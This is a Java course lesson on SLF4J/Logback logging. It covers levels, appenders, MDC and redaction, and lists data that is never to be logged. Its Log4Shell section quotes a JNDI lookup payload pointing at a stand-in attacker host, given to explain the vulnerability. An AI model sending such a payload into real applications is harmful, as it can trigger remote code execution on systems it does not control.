# Day 073A ➕

**L-073A** · Logging with SLF4J/Logback — the facade pattern, levels, appenders, MDC, and what never
to log

**Time:** 2 hrs · **Mode:** NEW · **Added day** — not in the original roadmap

> **Why this day was added.** Logging appears nowhere in the 488-day roadmap, and yet it is in every
> class you will ever write, it is the *only* window you have into production, and it is one of the
> most common places to leak credentials and personal data into a file that gets shipped to a
> third-party aggregator. Three days from now (Day 076) you diagnose a live JVM; the logs are what
> you look at first. **Log4Shell (CVE-2021-44228)** — arguably the worst vulnerability of the last
> decade — was a logging library.

---

# Part 1 — The facade

## Why there are two libraries, not one

```xml
<dependency><groupId>org.slf4j</groupId><artifactId>slf4j-api</artifactId></dependency>       <!-- API -->
<dependency><groupId>ch.qos.logback</groupId><artifactId>logback-classic</artifactId></dependency> <!-- impl -->
```

**SLF4J is an interface; Logback (or Log4j2) is the implementation.** You compile against the
facade and bind an implementation at runtime.

The reason is a real problem: a library that logs directly to Log4j forces *every* application using
it to also use Log4j. With ten libraries you would have four logging frameworks, four config files
and four sets of output. SLF4J solves it — libraries depend on the API only, and the *application*
chooses the implementation.

```
your code ──► slf4j-api ──► (binding chosen at runtime) ──► Logback / Log4j2 / java.util.logging
                  ▲
      jcl-over-slf4j, log4j-over-slf4j, jul-to-slf4j   ← BRIDGES: legacy calls rerouted here
```

Those bridges matter in practice. A dependency using commons-logging or JUL will log to its own
system and its output will vanish from your file — unless you add the bridge, which re-routes it
into SLF4J. **A missing bridge is why "that library's logs never appear anywhere".**

The rule: **`slf4j-api` at compile scope, exactly one binding at runtime scope.** Two bindings and
SLF4J prints a "Class path contains multiple SLF4J bindings" warning and picks one arbitrarily.

## The API, and the one non-negotiable idiom

```java
private static final Logger log = LoggerFactory.getLogger(OrderService.class);
```

`private static final`, named `log`, typed by the class. Lombok's `@Slf4j` generates exactly that
line.

```java
log.info("Order {} created for customer {}", orderId, customerId);   // ✅ parameterised
log.info("Order " + orderId + " created for " + customerId);         // ❌ string concatenation
```

**Use `{}` placeholders. Always.** With concatenation, the string is built *before* the call, so a
`debug` line in a hot loop pays for concatenation on every iteration even when debug is disabled. In
a tight loop that is a measurable cost for output nobody reads. With placeholders, formatting happens
only if the level is enabled.

For an expensive *argument* (not just concatenation), guard or use a supplier:

```java
if (log.isDebugEnabled()) log.debug("state: {}", expensiveDump());
log.atDebug().setMessage("state: {}").addArgument(() -> expensiveDump()).log();   // SLF4J 2.x
```

And the exception idiom — the last argument, with no placeholder:

```java
log.error("Payment failed for order {}", orderId, exception);   // ✅ full stack trace
log.error("Payment failed: " + exception.getMessage());          // ❌ cause and trace lost
```

That second form is the same mistake as Day 061's dropped cause, and it is just as damaging: you get
one line saying "connection reset" with no idea where.

## Levels — decide by audience, not by feeling

| Level | Meaning | Who acts |
|---|---|---|
| `ERROR` | Something failed that needs a human | **on-call** — should page |
| `WARN` | Recovered, degraded, or approaching a limit | reviewed next morning |
| `INFO` | A significant business event | support, audit |
| `DEBUG` | Diagnostic detail, off in production | developer |
| `TRACE` | Firehose — per-iteration, wire dumps | developer, briefly |

The test that keeps levels honest:

> **`ERROR` means someone should be woken up. If nobody would act on it, it is not an error.**

Two anti-patterns follow. **Error-level noise destroys alerting** — once ERROR fires 400 times a day
for a retryable timeout, the team mutes it and misses the real one. And **`INFO` on every method
entry** produces gigabytes nobody reads and costs real money at the aggregator.

A validation failure caused by bad user input is `WARN` at most — usually `INFO` or nothing. It is
the *user's* mistake, not your system's.

## Logback configuration

`src/main/resources/logback-spring.xml` (or `logback.xml` outside Spring):

```xml
<configuration>
  <appender name="CONSOLE" class="ch.qos.logback.core.ConsoleAppender">
    <encoder>
      <pattern>%d{HH:mm:ss.SSS} %-5level [%thread] %logger{36} [%X{requestId}] - %msg%n</pattern>
    </encoder>
  </appender>

  <appender name="FILE" class="ch.qos.logback.core.rolling.RollingFileAppender">
    <file>logs/app.log</file>
    <rollingPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedRollingPolicy">
      <fileNamePattern>logs/app.%d{yyyy-MM-dd}.%i.log.gz</fileNamePattern>
      <maxFileSize>100MB</maxFileSize>
      <maxHistory>30</maxHistory>
      <totalSizeCap>3GB</totalSizeCap>       <!-- ← the line that prevents a full disk -->
    </rollingPolicy>
    <encoder><pattern>%d %-5level [%thread] %logger - %msg%n</pattern></encoder>
  </appender>

  <appender name="ASYNC" class="ch.qos.logback.classic.AsyncAppender">
    <queueSize>512</queueSize>
    <discardingThreshold>0</discardingThreshold>   <!-- 0 = never silently drop -->
    <appender-ref ref="FILE"/>
  </appender>

  <logger name="com.acme.orders" level="DEBUG"/>
  <logger name="org.hibernate.SQL" level="WARN"/>

  <root level="INFO">
    <appender-ref ref="CONSOLE"/>
    <appender-ref ref="ASYNC"/>
  </root>
</configuration>
```

Four things worth understanding rather than copying.

**Logger names are hierarchical and inherit.** `com.acme.orders.OrderService` inherits from
`com.acme.orders`, then `com.acme`, then root. That is why naming loggers by class works — you can
turn up logging for one package without touching anything else.

**`totalSizeCap` is a production incident prevention.** Logs filling the disk takes the whole host
down, including the service you were trying to debug.

**`AsyncAppender` decouples logging from your request thread**, but it has a bounded queue: by
default it *drops* TRACE/DEBUG/INFO when the queue is 80% full. `discardingThreshold=0` disables
that, at the cost of blocking when the queue fills. Decide deliberately which you want.

**Never log to a file in a container.** Write to stdout and let the platform collect it — files in
an ephemeral container are lost on restart, exactly when you need them.

## MDC — and it is `ThreadLocal` again

Mapped Diagnostic Context attaches key-value pairs to *every* log line from the current thread:

```java
public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) {
    String requestId = Optional.ofNullable(header("X-Request-Id"))
                               .orElseGet(() -> UUID.randomUUID().toString());
    MDC.put("requestId", requestId);
    MDC.put("userId", currentUserId());
    try {
        chain.doFilter(req, res);
    } finally {
        MDC.clear();                     // ← MANDATORY. Day 066A.
    }
}
```

Now `%X{requestId}` in the pattern stamps every line, and you can filter one request's entire
journey out of a million interleaved lines. Propagate the id to downstream services in a header and
you can trace a request across the whole system — which is what distributed tracing formalises.

**MDC is backed by a `ThreadLocal`, so every rule from Day 066A applies**: `MDC.clear()` in a
`finally` or a pooled thread carries one request's id into the next request's logs, and you will
chase a bug that belongs to a different user. It also does not propagate across an executor
hand-off — pass the map explicitly:

```java
Map<String, String> ctx = MDC.getCopyOfContextMap();
executor.submit(() -> {
    MDC.setContextMap(ctx);
    try { work(); } finally { MDC.clear(); }
});
```

## Structured logging

```
2026-08-14 10:22:01 INFO  Order 88213 shipped to Chennai in 240ms
```

```json
{"ts":"2026-08-14T10:22:01Z","level":"INFO","msg":"order shipped",
 "orderId":88213,"city":"Chennai","durationMs":240,"requestId":"a3f…","service":"orders"}
```

The first is readable by a human. The second is **queryable**: "p99 duration for orders to Chennai
last week" is one query rather than a regex over text. Once logs go to Elasticsearch, Datadog, Loki
or CloudWatch, JSON is what makes them useful.

Add `logstash-logback-encoder` and use the `net.logstash.logback.argument.StructuredArguments`
helpers, or `logback-json-encoder`. Keep the message a **stable string** and put the variable parts
in fields — that way you can group by message.

---

# Part 2 — What never to log

This is the half that gets people fired.

## The forbidden list

| Never log | Why |
|---|---|
| Passwords, even wrong ones | Plain text, in a file, shipped to a third party |
| Full card numbers, CVV | PCI-DSS violation; CVV must never be stored *at all* |
| Session tokens, JWTs, API keys | A log reader becomes an authenticated user |
| `Authorization` / `Cookie` headers | Same |
| Full request/response bodies | Contains all of the above |
| National ids, full addresses, DOB | GDPR/DPDP personal data |
| Encryption keys | Obvious, and it happens |
| Full stack traces to the *user* | Day 062 — reconnaissance |

**Logs are the softest target in a system.** They are copied to an aggregator, retained for months,
readable by everyone on the team plus support plus the vendor, backed up, and rarely encrypted. A
secret in a log is a secret in a dozen places you have not thought about.

## Redaction

```java
// mask, do not omit — you still want to know a card was involved
static String maskCard(String pan) {
    return pan == null || pan.length() < 4 ? "****"
         : "*".repeat(pan.length() - 4) + pan.substring(pan.length() - 4);
}

log.info("charged card {} for {}", maskCard(pan), amount);   // charged card ************4242
log.info("user {} logged in", userId);                        // an ID, not an email
```

Prefer an **opaque id** over the personal data itself. `userId=44718` is as useful for debugging and
carries no personal information.

The most reliable defence is at the *type* level: never let a secret's `toString` produce the
secret.

```java
public final class ApiKey {
    private final char[] value;
    @Override public String toString() { return "ApiKey[REDACTED]"; }   // ← cannot leak by accident
}
```

That way `log.info("config {}", config)` cannot expose it, no matter who writes the call. Records
are a hazard here: **a `record` generates a `toString` containing every component**, so a record
holding a token will print it. Override `toString` explicitly.

Belt-and-braces: a Logback `RegexReplaceAction` or a custom converter that masks anything matching a
card or JWT pattern before it reaches the appender.

## Log4Shell — why this is a security topic

In December 2021, Log4j2 was found to expand `${jndi:ldap://attacker.com/x}` **inside a logged
message**, then fetch and execute the class it pointed to. Logging a user-controlled string — a
username, a `User-Agent` header — was remote code execution.

Two lessons that outlive the CVE:

1. **A logging library is untrusted-input-handling code.** It processes attacker-controlled strings
   on every request. Patch it like you patch your web framework.
2. **Message lookups/interpolation in log messages is a dangerous feature.** SLF4J's `{}`
   placeholders do not interpret content — they substitute it. That design difference is why
   Logback was unaffected.

And the operational lesson: teams that could not answer "which of our services use Log4j and at what
version" spent a week finding out. `mvn dependency:tree` (Day 073) is a security tool.

## Code to type

```java
import org.slf4j.*;
import java.util.*;
import java.util.concurrent.*;

public class LoggingDemo {
    private static final Logger log = LoggerFactory.getLogger(LoggingDemo.class);

    public static void main(String[] args) throws Exception {
        // 1. placeholders vs concatenation, measured
        int n = 1_000_000;
        long t0 = System.nanoTime();
        for (int i = 0; i < n; i++) log.debug("value is " + i + " at " + System.nanoTime());
        long concat = System.nanoTime() - t0;

        t0 = System.nanoTime();
        for (int i = 0; i < n; i++) log.debug("value is {} at {}", i, System.nanoTime());
        long placeholder = System.nanoTime() - t0;

        log.info("concat {} ms, placeholder {} ms (DEBUG disabled)",
                 concat / 1_000_000, placeholder / 1_000_000);

        // 2. the exception idiom
        try { Integer.parseInt("nope"); }
        catch (NumberFormatException e) {
            log.error("bad input {}", "nope", e);          // ← stack trace included
            log.error("bad input: " + e.getMessage());     // ← trace lost
        }

        // 3. MDC across a request
        ExecutorService pool = Executors.newFixedThreadPool(2);
        for (int i = 1; i <= 4; i++) {
            final String reqId = "req-" + i;
            pool.submit(() -> {
                MDC.put("requestId", reqId);
                try { log.info("handling"); Thread.sleep(50); log.info("done"); }
                catch (InterruptedException e) { Thread.currentThread().interrupt(); }
                // deliberately NO MDC.clear() — see what the next task logs
            });
        }
        pool.shutdown(); pool.awaitTermination(5, TimeUnit.SECONDS);

        // 4. a record leaks
        record Credentials(String user, String token) {}
        log.info("creds: {}", new Credentials("ram", "eyJhbGciOiJIUzI1NiJ9.secret"));
    }
}
```

Run it with `%X{requestId}` in your pattern. **Section 1** should show placeholders being several
times faster with DEBUG disabled — the concatenation happens regardless. **Section 3** shows a
request id bleeding across tasks because `MDC.clear()` is missing. **Section 4** prints your token
in full, which is the record hazard in one line.

---

## Common mistakes

| Mistake | Consequence |
|---|---|
| String concatenation in log calls | Cost paid even when the level is off |
| `log.error("msg: " + e.getMessage())` | Stack trace and cause lost |
| ERROR for retryable/expected failures | Alert fatigue; the real error gets muted |
| INFO on every method entry | Gigabytes, real cost, no signal |
| `MDC.put` without `clear()` in `finally` | One request's id on another request's logs |
| Assuming MDC crosses an executor | Empty context on the pool thread |
| Logging headers or request bodies | Credentials in a third-party system |
| A `record` holding a secret | `toString` prints it |
| Two SLF4J bindings | Arbitrary choice; confusing output |
| Missing legacy bridges | A dependency's logs disappear |
| File appender in a container | Logs lost on restart |
| No `totalSizeCap` | Disk fills; host dies |

---

## Interview questions

**Q: Why SLF4J rather than logging directly?**
It is a facade, so libraries depend only on the API and the application picks the implementation.
Without it, every library forces its own framework on you.

**Q: Why parameterised messages?**
The string is only built when the level is enabled. Concatenation happens unconditionally, so a
disabled DEBUG line still costs.

**Q: How do you correlate log lines for one request?**
MDC — put a request id at the start of the request, reference it in the pattern with `%X{…}`, clear
it in a `finally`. Propagate the id downstream in a header for cross-service tracing.

**Q: Why is MDC dangerous with thread pools?**
It is `ThreadLocal`-backed, so without `clear()` a pooled thread carries the previous request's
context into the next one — and it does not propagate across an async hand-off.

**Q: What should never be logged?**
Credentials, tokens, card data, `Authorization` headers, full request bodies, and personal data. Log
opaque ids instead, mask what must appear, and make secret types' `toString` redact by construction.

**Q: What was Log4Shell, in one sentence?**
Log4j2 interpolated a JNDI lookup inside a logged message, so logging attacker-controlled input
fetched and executed remote code — which is why a logging library must be treated as
untrusted-input-handling code.

---

## Mini task

1. Wire SLF4J + Logback into yesterday's Maven project. Confirm exactly one binding on the tree.
2. Run `LoggingDemo` and record the concat-vs-placeholder timings with DEBUG disabled, then enabled.
3. Compare the two error-logging forms in the output file.
4. Add `%X{requestId}` to your pattern, run section 3, and find the bleeding id. Then add
   `MDC.clear()` in a `finally` and confirm it stops.
5. Write an MDC-copying `Runnable` wrapper and prove context crosses to the pool thread.
6. Configure the rolling appender with a 1 MB max size and generate enough output to roll it.
7. Write an `ApiKey` type whose `toString` redacts, and prove `log.info("{}", key)` cannot leak it.
8. Switch to a JSON encoder and confirm the output parses as JSON.

---

# 🚪 Exit questions

1. What problem does the facade pattern solve here?
2. What is a bridge, and what symptom does a missing one cause?
3. Why is `log.debug("x" + y)` worse than `log.debug("x{}", y)` even when DEBUG is off?
4. Give the correct idiom for logging an exception, and what the wrong one loses.
5. State the test for whether something is `ERROR`.
6. Why does alert fatigue make over-logging a *safety* problem, not a tidiness one?
7. How does logger-name hierarchy let you raise the level for one package?
8. What does `totalSizeCap` prevent?
9. What is MDC, what backs it, and what are its two failure modes?
10. List eight things you must never log.
11. Why is a `record` a leak hazard?
12. What made Logback immune to the Log4Shell class of bug?

## 🎙️ Articulation drill

Two minutes: **"How do you set up logging for a production service?"**

Facade plus one binding plus bridges, class-named loggers, parameterised messages, levels chosen by
who acts, MDC request id cleared in a `finally`, JSON to stdout for the aggregator, rolling with a
size cap if files are used, and an explicit redaction policy. Close with Log4Shell as the reason the
logging library is on your patch list — that is the sentence that shows you think of logging as
part of the security surface.

---

**Previous:** [Day 073](Day-073.md) · **Next:** [Day 074](Day-074.md) — JUnit 5

> Back to the main line. Testing next — and the parallel track is the 40-question OS drill that
> closes the B-series you have been running since Day 023.
